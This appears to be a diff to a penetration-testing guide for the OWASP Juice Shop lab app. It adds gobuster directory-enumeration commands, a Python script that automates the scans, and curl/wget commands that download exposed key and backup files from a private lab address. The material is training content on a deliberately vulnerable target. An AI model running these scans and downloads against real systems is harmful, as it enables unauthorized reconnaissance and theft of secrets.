@@ -444,10 +444,265 @@ if __name__ == "__main__":
 
 ## 4. Sensitive Data Exposure
 
+### Directory and File Discovery with Gobuster
+
+**Objective:** Discover hidden files, directories, and sensitive endpoints
+
+**Prerequisites:**
+
+```zsh
+# Install gobuster (if not already installed)
+brew install gobuster
+
+# Download common wordlists
+git clone https://github.com/danielmiessler/SecLists.git ~/SecLists
+```
+
+**Steps:**
+
+#### 1. Basic Directory Enumeration
+
+```zsh
+# Basic directory discovery
+gobuster dir -u http://10.30.0.237:3000 \
+  -w ~/SecLists/Discovery/Web-Content/common.txt \
+  -t 50 -x txt,php,html,js,json,xml
+
+# Extended directory discovery
+gobuster dir -u http://10.30.0.237:3000 \
+  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -t 100 -x txt,php,html,js,json,xml,bak,old \
+  --timeout 10s
+```
+
+#### 2. API Endpoint Discovery
+
+```zsh
+# Discover API endpoints
+gobuster dir -u http://10.30.0.237:3000/api \
+  -w ~/SecLists/Discovery/Web-Content/api/objects.txt \
+  -t 50
+
+# REST API enumeration
+gobuster dir -u http://10.30.0.237:3000/rest \
+  -w ~/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
+  -t 50
+```
+
+#### 3. File Extension Fuzzing
+
+```zsh
+# Look for backup files and configs
+gobuster dir -u http://10.30.0.237:3000 \
+  -w ~/SecLists/Discovery/Web-Content/raft-small-files.txt \
+  -t 50 -x bak,backup,old,orig,save,conf,config,ini
+
+# Search for common sensitive files
+gobuster dir -u http://10.30.0.237:3000 \
+  -w ~/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt \
+  -t 50 -x php,txt,log
+```
+
+#### 4. Admin Panel Discovery
+
+```zsh
+# Find admin panels and management interfaces
+gobuster dir -u http://10.30.0.237:3000 \
+  -w ~/SecLists/Discovery/Web-Content/CMS/wp-admin.txt \
+  -t 50
+
+# Custom admin wordlist for Juice Shop
+echo -e "admin\nadministration\nmanagement\nscore-board\naccounting\nmetrics\nmonitoring" > juice_admin.txt
+gobuster dir -u http://10.30.0.237:3000 \
+  -w juice_admin.txt \
+  -t 20
+```
+
+#### 5. Comprehensive Automation Script
+
+```python
+#!/usr/bin/env python3
+"""
+Gobuster Automation for OWASP Juice Shop
+"""
+import subprocess
+import json
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+class JuiceShopGobuster:
+    def __init__(self, target_url="http://10.30.0.237:3000"):
+        self.target_url = target_url
+        self.wordlists = {
+            "common": "~/SecLists/Discovery/Web-Content/common.txt",
+            "medium": "~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+            "big": "~/SecLists/Discovery/Web-Content/big.txt",
+            "files": "~/SecLists/Discovery/Web-Content/raft-small-files.txt",
+            "api": "~/SecLists/Discovery/Web-Content/api/objects.txt"
+        }
+        self.results = []
+
+    def run_gobuster(self, path="", wordlist="common", extensions="txt,php,html,js,json"):
+        """Run gobuster with specified parameters"""
+        full_url = f"{self.target_url}{path}"
+        wordlist_path = self.wordlists.get(wordlist, wordlist)
+
+        cmd = [
+            "gobuster", "dir",
+            "-u", full_url,
+            "-w", wordlist_path,
+            "-t", "50",
+            "-x", extensions,
+            "--timeout", "10s",
+            "-q"  # Quiet mode for cleaner output
+        ]
+
+        print(f"[+] Running: {' '.join(cmd)}")
+
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+            findings = []
+
+            for line in result.stdout.split('\n'):
+                if line.strip() and not line.startswith('='):
+                    findings.append(line.strip())
+
+            return {
+                "path": path,
+                "wordlist": wordlist,
+                "findings": findings,
+                "success": True
+            }
+        except subprocess.TimeoutExpired:
+            return {
+                "path": path,
+                "wordlist": wordlist,
+                "findings": [],
+                "success": False,
+                "error": "Timeout"
+            }
+        except Exception as e:
+            return {
+                "path": path,
+                "wordlist": wordlist,
+                "findings": [],
+                "success": False,
+                "error": str(e)
+            }
+
+    def comprehensive_scan(self):
+        """Run comprehensive gobuster scans"""
+        scan_targets = [
+            {"path": "", "wordlist": "common", "extensions": "txt,html,js,json,xml"},
+            {"path": "/api", "wordlist": "api", "extensions": ""},
+            {"path": "/rest", "wordlist": "common", "extensions": ""},
+            {"path": "", "wordlist": "files", "extensions": "bak,backup,old,conf,log"},
+            {"path": "/ftp", "wordlist": "common", "extensions": "txt,pdf,zip,tar.gz"},
+        ]
+
+        with ThreadPoolExecutor(max_workers=3) as executor:
+            futures = []
+            for target in scan_targets:
+                future = executor.submit(
+                    self.run_gobuster,
+                    target["path"],
+                    target["wordlist"],
+                    target["extensions"]
+                )
+                futures.append(future)
+
+            for future in futures:
+                result = future.result()
+                self.results.append(result)
+                if result["success"] and result["findings"]:
+                    print(f"\n[!] Found paths for {result['path']}:")
+                    for finding in result["findings"]:
+                        print(f"    {finding}")
+
+    def generate_report(self):
+        """Generate findings report"""
+        all_findings = []
+        for result in self.results:
+            if result["success"]:
+                all_findings.extend(result["findings"])
+
+        report = {
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "target": self.target_url,
+            "total_findings": len(all_findings),
+            "results": self.results,
+            "unique_findings": list(set(all_findings))
+        }
+
+        with open("juice_shop_gobuster_report.json", "w") as f:
+            json.dump(report, f, indent=2)
+
+        print(f"\n{'='*50}")
+        print("GOBUSTER SCAN REPORT")
+        print(f"{'='*50}")
+        print(f"Total findings: {report['total_findings']}")
+        print("Report saved to: juice_shop_gobuster_report.json")
+
+        return report
+
+if __name__ == "__main__":
+    scanner = JuiceShopGobuster()
+    scanner.comprehensive_scan()
+    scanner.generate_report()
+```
+
 ### Accessing Confidential Files
+
+#### Manual Discovery
 
 1. Go to `/ftp` or `/encryptionkeys` endpoints.
 2. Download files directly.
+3. Try common paths:
+   - `/robots.txt`
+   - `/sitemap.xml`
+   - `/security.txt`
+   - `/.well-known/`
+   - `/backup/`
+   - `/config/`
+
+#### Specific Juice Shop Sensitive Endpoints
+
+```zsh
+# Test known sensitive endpoints
+curl -I http://10.30.0.237:3000/ftp
+curl -I http://10.30.0.237:3000/encryptionkeys
+curl -I http://10.30.0.237:3000/robots.txt
+curl -I http://10.30.0.237:3000/security.txt
+curl -I http://10.30.0.237:3000/.well-known/security.txt
+
+# Download accessible files
+wget http://10.30.0.237:3000/ftp/package.json.bak
+wget http://10.30.0.237:3000/encryptionkeys/premium.key
+```
+
+#### Automated File Discovery
+
+```zsh
+# Create custom wordlist for Juice Shop
+cat > juice_files.txt << EOF
+package.json.bak
+premium.key
+eastere.gg
+incident-support.kdbx
+coupons_2013.md.bak
+acquisitions.md
+legal.md
+package.json
+bower.json
+Gruntfile.js
+gulpfile.js
+EOF
+
+# Run gobuster with custom wordlist
+gobuster dir -u http://10.30.0.237:3000/ftp \
+  -w juice_files.txt \
+  -t 20 --timeout 5s
+```
 
 ---
 
